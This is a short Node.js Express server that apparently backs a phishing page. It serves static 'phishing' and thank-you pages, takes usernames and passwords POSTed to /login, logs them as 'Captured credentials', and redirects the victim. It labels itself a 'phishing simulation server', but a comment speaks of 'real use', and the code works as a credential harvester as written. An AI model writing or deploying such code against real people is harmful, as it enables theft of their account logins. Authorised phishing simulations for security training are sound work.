const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');

const app = express();
const port = 3000;

// Middleware to parse URL-encoded form data
app.use(bodyParser.urlencoded({ extended: false }));

// Serve static files (your phishing page and thankyou page) from 'public' folder
app.use(express.static(path.join(__dirname, 'public')));

// Endpoint to capture POSTed credentials
app.post('/login', (req, res) => {
  const username = req.body.username;
  const password = req.body.password;

  // Log credentials to console (for development/testing, replace with secure storage for real use)
  console.log('Captured credentials:', { username, password });

  // Redirect user to thank you page after capturing credentials
  res.redirect('/thankyou.html');
});

// Start the server
app.listen(port, () => {
  console.log(`Phishing simulation server running at http://localhost:${port}`);
});
